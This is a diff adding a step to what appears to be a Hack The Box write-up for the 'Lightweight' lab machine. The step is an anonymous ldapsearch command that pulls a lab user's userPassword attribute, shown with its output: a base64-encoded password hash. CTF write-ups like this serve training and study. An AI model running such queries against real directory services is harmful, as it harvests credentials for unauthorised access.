@@ -118,6 +118,28 @@ We can connect via ssh with `ssh 10.10.14.145@lightweight.htb` the password is `
 ```
 
 
+```BASH
+[10.10.14.145@lightweight ~]$ ldapsearch -x -H ldap://lightweight.htb -b "dc=lightweight,dc=htb" "(uid=ldapuser2)" userPassword
+# extended LDIF
+#
+# LDAPv3
+# base <dc=lightweight,dc=htb> with scope subtree
+# filter: (uid=ldapuser2)
+# requesting: userPassword 
+#
+
+# ldapuser2, People, lightweight.htb
+dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
+ zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+```
 
 
 ## 2. **Weaponization**
